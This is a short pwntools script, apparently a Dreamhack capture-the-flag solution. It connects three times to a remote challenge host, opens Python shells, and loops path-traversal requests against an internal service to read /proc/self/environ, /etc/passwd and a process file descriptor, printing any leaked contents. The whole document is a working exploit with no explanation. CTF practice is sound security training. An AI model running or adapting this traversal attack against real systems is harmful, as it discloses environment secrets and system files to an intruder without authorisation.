from pwn import *

r1 = remote("host1.dreamhack.games", 24166)
r2 = remote("host1.dreamhack.games", 24166)
r3 = remote("host1.dreamhack.games", 24166)

payload1 = b"""import requests

while True:
    requests.get("http://heliodor:58283/query/view/..proc..self..environ")

"""

payload2 = b"""import requests

while True:
    requests.get("http://heliodor:58283/query/view/..etc..passwd")

"""

payload3 = b"""import requests

while True:
    r = requests.get("http://heliodor:58283/query/view/..proc..self..fd..21").text
    if "error" not in r:
        print("find : " +r)


"""

r1.sendlineafter(b"$ ", b"python3")
r1.sendlineafter(b">>> ", payload1)
r2.sendlineafter(b"$ ", b"python3")
r2.sendlineafter(b">>> ", payload2)
r3.sendlineafter(b"$ ", b"python3")
r3.sendlineafter(b">>> ", payload3)

r3.interactive()